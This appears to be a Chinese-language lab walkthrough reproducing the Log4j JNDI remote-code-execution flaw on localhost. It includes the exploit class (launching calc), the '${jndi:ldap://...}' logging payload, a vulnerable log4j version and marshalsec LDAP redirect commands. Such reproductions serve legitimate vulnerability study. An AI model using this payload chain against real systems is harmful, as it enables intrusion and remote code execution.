# apache-log4j本地漏洞复现

exp（弹出一个计算器）

```java
public class exp {
    static {
        try {
            String [] cmd={"calc"};
            java.lang.Runtime.getRuntime().exec(cmd).waitFor();
        }catch (Exception e){
            e.printStackTrace();
        }
    }

}
```

Main

```java
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import java.io.IOException;

public class Main {
    public static final Logger logger = LogManager.getLogger(Main.class);
    public static void main(String[] args) throws IOException {
        logger.error("${jndi:ldap://127.0.0.1:1389/exp}");
    }
}
```

需要向pom.xml中导入以下配置

```xml
<dependencies>
        <!-- https://search.maven.org/ -->
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-core</artifactId>
            <version>2.14.0</version>
        </dependency>
        <!-- https://search.maven.org/ -->
        <dependency>
            <groupId>org.apache.logging.log4j</groupId>
            <artifactId>log4j-api</artifactId>
            <version>2.14.0</version>
        </dependency>
    </dependencies>
```

把exp的java源码用`javac exp.java`生成exp.class，记得最好单独放到一个文件夹里，在到这个文件夹下，用python2开个http服务`python -m http.server 8899`，如下说明成功

![image-20211210163035219](https://s2.loli.net/2021/12/10/d8AcUODlQP2RKxF.png)

复现之前，需要下载一个插件

`git clone git@github.com:mbechler/marshalsec.git`

用idea打开此项目，使用Maven生成jar包

先clean，然后package（中途可能会报错）

![image-20211210163227931](https://s2.loli.net/2021/12/10/6wPGI5TUkXgipn3.png)

然后单独用命令`java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8899/#exp"`

![image-20211210163848110](https://s2.loli.net/2021/12/10/yALQ5SOj2mrpEqG.png)

运行后显示1389为监听端口，这也是为什么我的main函数中的端口为1389

这样就成功了

![image-20211210164000550](https://s2.loli.net/2021/12/10/p45r2MFinb6OW8d.png)

